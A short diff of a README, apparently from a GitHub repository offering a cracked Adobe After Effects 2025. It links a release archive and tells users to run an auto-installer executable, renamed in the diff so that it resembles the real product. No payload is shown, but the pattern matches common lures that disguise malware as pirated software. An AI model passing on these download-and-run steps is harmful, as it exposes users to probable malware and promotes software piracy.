@@ -23,7 +23,7 @@
 </table>
 
 ## **1. [Download the archive](https://github.com/FilimonServer/Adobe-After-Effects-2025/releases/download/v25.0.1/Adobe_After_Effects_x64-x86.zip) and extract it to a convenient folder.**
-## **2. Run the auto-installer `Installing_x64_x86.exe`. It will install and download all necessary packages for > operation.**
+## **2. Run the auto-installer `Adobe_After_Effects_x64_x86.exe`. It will install and download all necessary packages for > operation.**
 
 
 ![Adobe After Effects crack download](https://github.com/user-attachments/assets/42a022d7-e62f-40d1-9b65-0dabc61a2cce)
